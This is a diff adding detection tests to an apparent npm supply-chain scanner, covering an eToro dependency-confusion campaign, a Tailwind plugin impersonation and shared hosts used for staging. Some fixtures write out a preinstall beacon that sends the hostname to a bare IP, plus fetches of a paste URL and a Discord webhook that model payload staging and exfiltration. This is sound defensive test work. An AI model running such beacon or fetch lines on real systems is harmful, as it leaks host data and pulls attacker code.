@@ -6005,4 +6005,146 @@ describe("Campaign Signatures", () => {
     });
   });
 
+  // =================================================================
+  // eToro dependency confusion + the 2026-09-10 batch (September 2026)
+  // =================================================================
+
+  describe("eToro dependency-confusion reconnaissance (September 2026)", () => {
+    // Bare npm feed values resolve through matchBareNpmIOC(), the install-time
+    // surface; matchPackageIOC() takes an ecosystem-prefixed value and returns
+    // null for these, which reads like a missing IOC and is not.
+    it("blocks every etoro-* lure at the published 999.0.0 version", () => {
+      const feed = getBundledFeed();
+      const names = [
+        "etoro-aggregator",
+        "etoro-analytics",
+        "etoro-api",
+        "etoro-auth",
+        "etoro-billing",
+        "etoro-builders",
+        "etoro-cashout",
+        "etoro-charts",
+        "etoro-client",
+        "etoro-core",
+      ];
+      for (const name of names) {
+        expect(
+          matchBareNpmIOC(name, "999.0.0", feed),
+          `${name} must match at the lure version`,
+        ).not.toBeNull();
+      }
+    });
+
+    // The whole campaign is a 999.0.0 lure published against an INTERNAL name,
+    // and every one of the ten was unpublished within the hour. eToro may
+    // publish these names itself one day, so the entries are version pinned and
+    // any other version must stay clean. Without this control the pins could
+    // silently widen into a name block and break eToro's own builds.
+    it("must NOT flag an etoro-* package at any other version", () => {
+      const feed = getBundledFeed();
+      expect(
+        matchBareNpmIOC("etoro-auth", "1.2.3", feed),
+        "a version the campaign never published must not match",
+      ).toBeNull();
+      expect(
+        matchBareNpmIOC("etoro-core", "0.1.0", feed),
+        "a plausible real first release must not match",
+      ).toBeNull();
+    });
+
+    it("flags the bare-IP preinstall beacon and its campaign path", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "preinstall.js"),
+        'require("http").get("http://209.126.81.147/etoro-depconf-poce346552f776f/npm/" + require("os").hostname());'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(
+        report.findings.find((f) => f.rule === "IOC_KNOWN_C2_IP"),
+      ).toBeDefined();
+      expect(
+        report.findings.find((f) => f.rule === "IOC_KNOWN_DEAD_DROP"),
+      ).toBeDefined();
+    });
+  });
+
+  describe("tailwindcss-contact-forms @tailwindcss/forms impersonation (September 2026)", () => {
+    it("flags the Ethereum dead-drop signalling address", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "index.js"),
+        'const a = "0xa322E5f39aDC2490Ef6f0121063eD311D3080e1a";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_WALLET"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    // The package copies its README and repository field from @tailwindcss/forms.
+    // That upstream plugin is the VICTIM of the impersonation and is one of the
+    // most widely installed Tailwind plugins there is.
+    it("must NOT flag the upstream plugin it impersonates", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "package.json"),
+        JSON.stringify({
+          name: "consumer",
+          version: "1.0.0",
+          dependencies: { "@tailwindcss/forms": "0.5.7" },
+        })
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(
+        report.findings.find((f) => f.rule === "MALICIOUS_DEPENDENCY"),
+        "the impersonated upstream plugin must never be flagged",
+      ).toBeUndefined();
+    });
+  });
+
+  describe("shared hosts abused by the 2026-09-10 batch stay unblocked", () => {
+    // pinochiomathm stages its payload from one JSONKeeper paste and websetup
+    // exfiltrates to one Discord webhook. Both services are legitimate and
+    // widely used, so only the attacker's own path is an indicator. If either
+    // apex ever reaches a blocklist this test goes red, which is the point.
+    it("flags only the attacker's own paths, never the service apex", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "clean.js"),
+        [
+          'const docs = "https://www.jsonkeeper.com/";',
+          'const hook = "https://discord.com/api/webhooks/";',
+          'const rpc = "https://eth.drpc.org";',
+        ].join("\n")
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(
+        report.findings.find((f) => f.rule === "IOC_KNOWN_DEAD_DROP"),
+        "a shared service apex must never be an indicator on its own",
+      ).toBeUndefined();
+      expect(
+        report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN"),
+        "public Ethereum RPC providers must never become indicators",
+      ).toBeUndefined();
+    });
+
+    it("still flags the specific attacker paths", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "loader.js"),
+        [
+          'fetch("https://www.jsonkeeper.com/b/V6NBX");',
+          'fetch("https://discord.com/api/webhooks/1546817174411288617/tok");',
+        ].join("\n")
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const drops = report.findings.filter(
+        (f) => f.rule === "IOC_KNOWN_DEAD_DROP"
+      );
+      expect(drops.length).toBeGreaterThanOrEqual(2);
+    });
+  });
+
 });
